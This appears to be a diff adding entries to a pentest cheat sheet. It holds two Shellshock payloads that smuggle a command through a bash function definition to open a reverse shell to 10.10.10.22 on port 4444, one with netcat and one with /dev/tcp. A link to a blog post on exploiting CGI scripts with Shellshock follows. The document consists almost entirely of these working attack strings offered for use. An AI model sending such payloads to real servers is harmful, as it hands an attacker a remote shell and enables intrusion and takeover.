@@ -1,0 +1,4 @@
+() { :;} echo {"SHELLSHOCK:"} $(/bin/nc -nv -e /bin/bash 10.10.10.22 4444)      //reverse shell with netcat
+() { ignored;};/bin/bash -i >& /dev/tcp/10.10.10.22/4444 0>&1                   //reverse shell uscing tcp
+
+https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock
